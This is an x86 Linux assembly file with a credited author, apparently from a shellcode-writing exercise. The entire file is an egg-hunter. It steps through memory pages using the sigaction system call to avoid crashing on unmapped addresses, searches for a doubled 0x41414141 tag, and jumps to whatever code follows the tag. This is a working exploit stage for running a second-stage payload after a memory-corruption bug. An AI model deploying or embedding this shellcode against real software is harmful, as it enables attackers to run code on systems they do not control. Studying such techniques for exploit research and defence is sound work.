; sigaction_egghunter.asm
; Author: German Namestnikov
 
global _start
 
section .text
 
_start:

page_alignment:    
    or cx,0xfff

egg_hunting:
    inc ecx
    
    push byte 0x43
    pop eax

    int 0x80

    cmp al, 0xf2
    jz page_alignment

    mov eax, 0x41414141
    
    mov edi, ecx

    scasd

    jnz egg_hunting
    scasd

    jnz egg_hunting
    jmp edi

